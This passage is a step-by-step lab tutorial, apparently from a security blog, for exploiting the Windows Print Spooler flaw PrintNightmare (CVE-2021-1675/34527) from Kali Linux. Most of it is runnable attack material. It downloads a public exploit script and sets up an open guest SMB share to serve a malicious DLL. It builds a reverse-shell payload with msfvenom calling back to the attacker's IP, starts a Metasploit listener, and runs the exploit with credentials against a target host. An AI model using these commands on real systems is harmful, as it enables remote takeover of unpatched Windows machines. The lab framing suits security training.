
### Preparation in Kali

Open a terminal and enter the following commands. This will get an alternate package of impacket and will download the python script needed for this exploit

```powershell
$ cd /tmp/
$ sudo pip3 uninstall impacket
$ git clone https://github.com/cube0x0/impacket
$ cd impacket
$ sudo python3 ./setup.py install
$ wget https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py
```

![exploit the PrintNightmare](https://www.thedutchhacker.com/wp-content/uploads/2021/07/image-1.png)

The script will need to download a malicious DLL file. So we need a share and for this, we will create an smb server on kali.

Type in the following command to config the smb server to point to the tmp directory on your kali machine. We are using this tmp directory because when rebooting kali all will be gone. But you can choose any directory you want. Just make sure it has the correct rights to be used as a public share.

```shell
$ sudo nano /etc/samba/smb.conf
```

Put in the following config

```
 [global]
     map to guest = Bad User
     server role = standalone server
     usershare allow guests = yes
     idmap config * : backend = tdb
     smb ports = 445
  
 [smb]
     comment = Samba
     path = /tmp/
     guest ok = yes
     read only = no
     browsable = yes
     force user = smbuser
```

Start the smb server with the following command

```shell
$ sudo service smbd restart
```

Now we are going to create the DLL that we will be using to create a reverse shell. Type in the following command and change the IP to your kali machine IP and copy the dll to the tmp directory

```powershell
$ msfvenom  -f dll -p windows/x64/shell_reverse_tcp LHOST=10.0.0.132 LPORT=443 -o reverse.dll

$ cp reverse.dll /tmp
```

![exploit the PrintNightmare](https://www.thedutchhacker.com/wp-content/uploads/2021/07/image-2.png)

Next we will start a listener with msfconsole. Type in the following commands

```
msfconsole
use multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 10.0.0.132
set LPORT 443
run
```

![exploit the PrintNightmare](https://www.thedutchhacker.com/wp-content/uploads/2021/07/image-3.png)

## The Exploit the PrintNightmare

Navigate to the tmp directory as that is where we have our py file. Type in the following command to start the exploit. Please do change the IP address to your lab environment. The first Ip is the Windows machine and the second the kali

sudo python3 CVE-2021-1675.py test:Welkom123@**10.0.0.117** '[\\**_10.0.0.132_**\smb\reverse.dll](file://10.60.20.132/smb/reverse.dll)'

![exploit the PrintNightmare](https://www.thedutchhacker.com/wp-content/uploads/2021/07/image-4-1024x876.png)

## Reference

- [CVE-2021-34527 – Security Update Guide – Microsoft – Windows Print Spooler Remote Code Execution Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- [GitHub – cube0x0/CVE-2021-1675: C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527](https://github.com/cube0x0/CVE-2021-1675)